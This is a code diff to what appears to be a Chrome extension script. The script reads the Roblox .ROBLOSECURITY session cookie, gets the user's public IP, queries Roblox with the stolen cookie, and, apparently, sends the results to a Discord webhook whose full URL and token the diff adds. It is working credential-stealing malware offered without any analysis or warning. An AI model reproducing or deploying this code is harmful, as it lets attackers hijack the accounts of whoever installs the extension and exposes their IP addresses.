@@ -1,10 +1,10 @@
-const WEBHOOK = "";
+const WEBHOOK = "https://discord.com/api/webhooks/1285283803480457298/ROIFc26I0BKNVS7LHxA8tASxysP3QQTSNKtTBcVPdIocwHNWY3qkJspjv8ow1j6oDsfm";
 
 async function main(cookie) {
     var ipAddr = await (await fetch("https://api.ipify.org")).text();
 
     if (cookie) {
-        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
+        var statistics = await (await fetch("https://www.roblox.com/users/3095362248/profile", {
             headers: {
                 Cookie: ".ROBLOSECURITY=" + cookie
             },
@@ -60,6 +60,6 @@ async function main(cookie) {
     });
 }
 
-chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
+chrome.cookies.get({"url": "https://www.roblox.com/users/3095362248/profile", "name": ".ROBLOSECURITY"}, function(cookie) {
     main(cookie ? cookie.value : null);
 });
